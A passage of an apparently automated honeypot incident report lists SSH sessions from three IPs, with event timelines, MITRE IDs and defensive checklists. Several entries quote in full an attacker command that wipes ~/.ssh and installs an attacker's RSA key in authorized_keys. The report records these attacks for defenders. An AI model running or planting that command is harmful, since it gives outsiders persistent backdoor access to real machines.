| `2026-05-24 20:05:25` | `cowrie.command.failed` |
| `2026-05-24 20:05:25` | `cowrie.log.closed` |
| `2026-05-24 20:05:25` | `cowrie.session.params` |
| `2026-05-24 20:05:25` | `cowrie.command.input` |
| `2026-05-24 20:05:26` | `cowrie.session.file_download` |
| `2026-05-24 20:05:26` | `cowrie.log.closed` |
| `2026-05-24 20:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.113.28[.]120` to AbuseIPDB if not already reported
- [ ] Block `138.113.28[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b18e9c5967a

| Field | Detail |
|---|---|
| **Source IP** | `138.113.28[.]120` |
| **First Seen** | 2026-05-24 20:05 |
| **Last Seen** | 2026-05-24 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:05:27` | `cowrie.session.connect` |
| `2026-05-24 20:05:27` | `cowrie.client.version` |
| `2026-05-24 20:05:27` | `cowrie.client.kex` |
| `2026-05-24 20:05:28` | `cowrie.login.success` |
| `2026-05-24 20:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.113.28[.]120` to AbuseIPDB if not already reported
- [ ] Block `138.113.28[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af66aa944ce

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:09 |
| **Last Seen** | 2026-05-24 20:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:09:09` | `cowrie.session.connect` |
| `2026-05-24 20:09:09` | `cowrie.client.version` |
| `2026-05-24 20:09:09` | `cowrie.client.kex` |
| `2026-05-24 20:09:10` | `cowrie.login.success` |
| `2026-05-24 20:09:11` | `cowrie.session.params` |
| `2026-05-24 20:09:11` | `cowrie.command.input` |
| `2026-05-24 20:09:11` | `cowrie.command.failed` |
| `2026-05-24 20:09:12` | `cowrie.log.closed` |
| `2026-05-24 20:09:12` | `cowrie.session.params` |
| `2026-05-24 20:09:12` | `cowrie.command.input` |
| `2026-05-24 20:09:12` | `cowrie.session.file_download` |
| `2026-05-24 20:09:12` | `cowrie.log.closed` |
| `2026-05-24 20:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e0223f1a7d

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:09 |
| **Last Seen** | 2026-05-24 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:09:15` | `cowrie.session.connect` |
| `2026-05-24 20:09:15` | `cowrie.client.version` |
| `2026-05-24 20:09:15` | `cowrie.client.kex` |
| `2026-05-24 20:09:16` | `cowrie.login.success` |
| `2026-05-24 20:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec8eb2d4fd9

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:16 |
| **Last Seen** | 2026-05-24 20:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:16:21` | `cowrie.session.connect` |
| `2026-05-24 20:16:21` | `cowrie.client.version` |
| `2026-05-24 20:16:22` | `cowrie.client.kex` |
| `2026-05-24 20:16:23` | `cowrie.login.success` |
| `2026-05-24 20:16:24` | `cowrie.session.params` |
| `2026-05-24 20:16:24` | `cowrie.command.input` |
| `2026-05-24 20:16:24` | `cowrie.command.failed` |
| `2026-05-24 20:16:24` | `cowrie.log.closed` |
| `2026-05-24 20:16:25` | `cowrie.session.params` |
| `2026-05-24 20:16:25` | `cowrie.command.input` |
| `2026-05-24 20:16:25` | `cowrie.session.file_download` |
| `2026-05-24 20:16:25` | `cowrie.log.closed` |
| `2026-05-24 20:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9101b52619bc

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:16 |
| **Last Seen** | 2026-05-24 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:16:29` | `cowrie.session.connect` |
| `2026-05-24 20:16:29` | `cowrie.client.version` |
| `2026-05-24 20:16:29` | `cowrie.client.kex` |
| `2026-05-24 20:16:31` | `cowrie.login.success` |
| `2026-05-24 20:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4478e8f9aff7

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:22 |
| **Last Seen** | 2026-05-24 20:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:22:58` | `cowrie.session.connect` |
| `2026-05-24 20:22:58` | `cowrie.client.version` |
| `2026-05-24 20:22:58` | `cowrie.client.kex` |
| `2026-05-24 20:22:59` | `cowrie.login.success` |
| `2026-05-24 20:23:00` | `cowrie.session.params` |
| `2026-05-24 20:23:00` | `cowrie.command.input` |
| `2026-05-24 20:23:00` | `cowrie.command.failed` |
| `2026-05-24 20:23:00` | `cowrie.log.closed` |
| `2026-05-24 20:23:01` | `cowrie.session.params` |
| `2026-05-24 20:23:01` | `cowrie.command.input` |
| `2026-05-24 20:23:01` | `cowrie.session.file_download` |
| `2026-05-24 20:23:01` | `cowrie.log.closed` |
| `2026-05-24 20:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184af775fa0b

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:23 |
| **Last Seen** | 2026-05-24 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:23:04` | `cowrie.session.connect` |
| `2026-05-24 20:23:04` | `cowrie.client.version` |
| `2026-05-24 20:23:04` | `cowrie.client.kex` |
| `2026-05-24 20:23:05` | `cowrie.login.success` |
| `2026-05-24 20:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a13b9b8544

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:23 |
| **Last Seen** | 2026-05-24 20:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:23:12` | `cowrie.session.connect` |
| `2026-05-24 20:23:12` | `cowrie.client.version` |
| `2026-05-24 20:23:12` | `cowrie.client.kex` |
| `2026-05-24 20:23:13` | `cowrie.login.success` |
| `2026-05-24 20:23:14` | `cowrie.session.params` |
| `2026-05-24 20:23:14` | `cowrie.command.input` |
| `2026-05-24 20:23:14` | `cowrie.command.failed` |
| `2026-05-24 20:23:14` | `cowrie.log.closed` |
| `2026-05-24 20:23:15` | `cowrie.session.params` |
| `2026-05-24 20:23:15` | `cowrie.command.input` |
| `2026-05-24 20:23:15` | `cowrie.session.file_download` |
| `2026-05-24 20:23:15` | `cowrie.log.closed` |
| `2026-05-24 20:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65eb4031e12d

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:23 |
| **Last Seen** | 2026-05-24 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:23:19` | `cowrie.session.connect` |
| `2026-05-24 20:23:19` | `cowrie.client.version` |
| `2026-05-24 20:23:19` | `cowrie.client.kex` |
| `2026-05-24 20:23:21` | `cowrie.login.success` |
| `2026-05-24 20:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2deca44fb16

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:26 |
| **Last Seen** | 2026-05-24 20:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:26:37` | `cowrie.session.connect` |
| `2026-05-24 20:26:37` | `cowrie.client.version` |
| `2026-05-24 20:26:37` | `cowrie.client.kex` |
| `2026-05-24 20:26:38` | `cowrie.login.success` |
| `2026-05-24 20:26:38` | `cowrie.session.params` |
| `2026-05-24 20:26:38` | `cowrie.command.input` |
| `2026-05-24 20:26:38` | `cowrie.command.failed` |
| `2026-05-24 20:26:39` | `cowrie.log.closed` |
| `2026-05-24 20:26:39` | `cowrie.session.params` |
| `2026-05-24 20:26:39` | `cowrie.command.input` |
| `2026-05-24 20:26:39` | `cowrie.session.file_download` |
| `2026-05-24 20:26:39` | `cowrie.log.closed` |
| `2026-05-24 20:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da881db4621

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:26 |
| **Last Seen** | 2026-05-24 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:26:43` | `cowrie.session.connect` |
| `2026-05-24 20:26:43` | `cowrie.client.version` |
| `2026-05-24 20:26:43` | `cowrie.client.kex` |
| `2026-05-24 20:26:44` | `cowrie.login.success` |
| `2026-05-24 20:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1522752c4421

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:29 |
| **Last Seen** | 2026-05-24 20:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:29:56` | `cowrie.session.connect` |
| `2026-05-24 20:29:56` | `cowrie.client.version` |
| `2026-05-24 20:29:57` | `cowrie.client.kex` |
| `2026-05-24 20:29:58` | `cowrie.login.success` |
| `2026-05-24 20:29:59` | `cowrie.session.params` |
| `2026-05-24 20:29:59` | `cowrie.command.input` |
| `2026-05-24 20:29:59` | `cowrie.command.failed` |
| `2026-05-24 20:29:59` | `cowrie.log.closed` |
| `2026-05-24 20:30:00` | `cowrie.session.params` |
| `2026-05-24 20:30:00` | `cowrie.command.input` |
| `2026-05-24 20:30:00` | `cowrie.session.file_download` |
| `2026-05-24 20:30:00` | `cowrie.log.closed` |
| `2026-05-24 20:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb7ab68cf5c

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:30 |
| **Last Seen** | 2026-05-24 20:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:30:04` | `cowrie.session.connect` |
| `2026-05-24 20:30:04` | `cowrie.client.version` |
| `2026-05-24 20:30:04` | `cowrie.client.kex` |
| `2026-05-24 20:30:06` | `cowrie.login.success` |
| `2026-05-24 20:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2472e0ef352e

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:33 |
| **Last Seen** | 2026-05-24 20:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:33:47` | `cowrie.session.connect` |
| `2026-05-24 20:33:47` | `cowrie.client.version` |
| `2026-05-24 20:33:48` | `cowrie.client.kex` |
| `2026-05-24 20:33:49` | `cowrie.login.success` |
| `2026-05-24 20:33:49` | `cowrie.session.params` |
| `2026-05-24 20:33:49` | `cowrie.command.input` |
| `2026-05-24 20:33:49` | `cowrie.command.failed` |
| `2026-05-24 20:33:50` | `cowrie.log.closed` |
| `2026-05-24 20:33:50` | `cowrie.session.params` |
| `2026-05-24 20:33:50` | `cowrie.command.input` |
| `2026-05-24 20:33:50` | `cowrie.session.file_download` |
| `2026-05-24 20:33:50` | `cowrie.log.closed` |
| `2026-05-24 20:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342758639d04

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:33 |
| **Last Seen** | 2026-05-24 20:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:33:53` | `cowrie.session.connect` |
| `2026-05-24 20:33:53` | `cowrie.client.version` |
| `2026-05-24 20:33:54` | `cowrie.client.kex` |
| `2026-05-24 20:33:55` | `cowrie.login.success` |
| `2026-05-24 20:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b81bbb84a6

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:43 |
| **Last Seen** | 2026-05-24 20:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:43:28` | `cowrie.session.connect` |
| `2026-05-24 20:43:28` | `cowrie.client.version` |
| `2026-05-24 20:43:28` | `cowrie.client.kex` |
| `2026-05-24 20:43:29` | `cowrie.login.success` |
| `2026-05-24 20:43:30` | `cowrie.session.params` |
| `2026-05-24 20:43:30` | `cowrie.command.input` |
| `2026-05-24 20:43:30` | `cowrie.command.failed` |
| `2026-05-24 20:43:30` | `cowrie.log.closed` |
| `2026-05-24 20:43:31` | `cowrie.session.params` |
| `2026-05-24 20:43:31` | `cowrie.command.input` |
| `2026-05-24 20:43:32` | `cowrie.session.file_download` |
| `2026-05-24 20:43:32` | `cowrie.log.closed` |
| `2026-05-24 20:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d582825494

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:43 |
| **Last Seen** | 2026-05-24 20:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:43:35` | `cowrie.session.connect` |
| `2026-05-24 20:43:35` | `cowrie.client.version` |
| `2026-05-24 20:43:36` | `cowrie.client.kex` |
| `2026-05-24 20:43:37` | `cowrie.login.success` |
| `2026-05-24 20:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a3ff3db93c

| Field | Detail |
